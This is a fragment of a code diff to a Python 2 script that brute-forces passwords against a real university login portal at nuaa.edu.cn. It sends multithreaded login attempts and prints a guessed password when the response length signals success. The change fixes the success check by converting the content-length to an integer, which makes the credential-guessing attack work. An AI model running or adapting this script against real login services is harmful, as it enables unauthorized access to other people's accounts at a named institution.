@@ -4,6 +4,7 @@ import requests
 import time
 import multiprocessing.dummy as multiThreading
 import multiprocessing
+import string
 
 
 request_url = "http://w.nuaa.edu.cn/iPortal/action/doLogin.do"
@@ -53,7 +54,7 @@ def verify(index, sem):
                 loginRequest = requests.post(request_url, data=login_info, headers=headers)
                 print login_info['password']
                 print loginRequest.headers['content-length']
-                if loginRequest.headers['content-length'] >= '1300':
+                if string.atoi(loginRequest.headers['content-length']) >= 258:
                     lock.acquire()
                     print "The password is " + login_info['password']
                     sem.set()
